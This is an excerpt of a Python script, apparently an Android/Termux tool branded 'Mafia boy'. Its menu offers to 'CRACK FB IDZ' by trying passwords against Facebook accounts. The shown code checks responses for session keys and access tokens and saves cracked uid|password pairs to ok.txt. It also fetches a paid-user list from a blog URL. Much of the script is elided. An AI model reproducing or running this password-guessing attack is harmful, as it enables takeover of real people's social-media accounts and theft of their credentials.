...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr Noman Khalid\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m ADMIN   : itâ€™s Mafia boy \x1b[0m\x1b[1;97m]
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://mrking03.blogspot.com/2022/06/devil.html?m=1/paid.txt/blob/main/paid.txt"])
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://mrking03.blogspot.com/2022/06/devil.html?m=1/paid.txt/blob/main/paid.txt').text
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m itâ€™s Mafia boy \x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook  :  Zihad Khan M.M.M  \x1b[0m\x1b[1;97m]
...
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€Ã— 
    ...
    """)
		...
		print("%s [%s1%s]%s CRACK  FB IDZ 2009-11 {JUST NOW} %s(Mafia-Clonning)"%(G,R,G,Y,B))
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [MAFIA_BOY-OK=>] %s | %s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("   [MAFIA_BOY-OK=>]  %s|%s\n"%(uid, pw))
...
if len(sys.argv) == 2:
	...
	if sys.argv[1] == "--info":
		...
		print("\n [*] Admin    : itâ€™s Mafia boy  ")

		print(" [*] Team      :  Noman nd King\n")

		print(" [ Sosial Medi  ] \n")

		print(" [*] Facebook  : https://www.facebook.com/profile.php?id=100061369206031")

		exit(" [*] GitHub    : https://github.com/ZihadVau99 ")
